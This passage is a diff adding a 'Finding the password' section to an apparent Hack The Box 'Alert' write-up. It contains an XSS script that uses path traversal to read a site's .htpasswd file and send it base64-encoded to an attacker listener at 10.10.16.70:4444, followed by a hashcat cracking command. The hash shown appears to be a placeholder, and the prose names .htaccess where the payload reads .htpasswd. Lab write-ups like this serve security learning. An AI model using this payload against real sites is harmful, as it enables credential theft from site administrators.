@@ -244,3 +244,45 @@ Let's travel to `etc/hosts` to try to find some more information about the domai
 Add `statistics.alert.htb` to the `/etc/hosts` file.
 
 ![exfil](resources/stats.JPG)
+
+#### Finding the password
+
+According to [apache.porg](https://httpd.apache.org/docs/2.4/programs/htpasswd.html) and [digitalocean.com](https://www.digitalocean.com/community/tutorials/how-to-set-up-password-authentication-with-apache-on-ubuntu-20-04), the passwords are stored in `/var/www/your_domain/.htpasswd`: *htpasswd is used to create and update the flat-files used to store usernames and password for basic authentication of HTTP users.*
+
+Let's try to read the `.htaccess` file.
+
+```markdown
+<script>
+  var url = "messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd"
+  var attacker = "http://10.10.16.70:4444/exfil"
+  var xhr = new XMLHttpRequest()
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+      fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+    }
+  }
+  xhr.open("GET", url, true)
+  xhr.send(null)
+</script>
+```
+
+Send the link to the administrator. We can see that the password for the `allbert` user is hashed.
+
+Let's try to crack the password using `hashcat`.
+
+```bash
+┌──(cherif㉿kali)-[~/Desktop/HTB/machines/Alert]
+└─$ echo "$apr1$1Z6Q7Q7W$3Z6Q7Q7W1Z6Q7Q7W1Z6Q7Q7W1Z6Q7Q7W/" > hash.txt
+
+┌──(cherif㉿kali)-[~/Desktop/HTB/machines/Alert]
+└─$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+- `-m 1600` specifies the hash type.
+- `hash.txt` is the file containing the hash.
+- `/usr/share/wordlists/rockyou.txt` is the wordlist.
+- `--force` is used to force CPU cracking if needed.
+
+We have the password!
+
+![exfil](resources/loggedin.JPG)
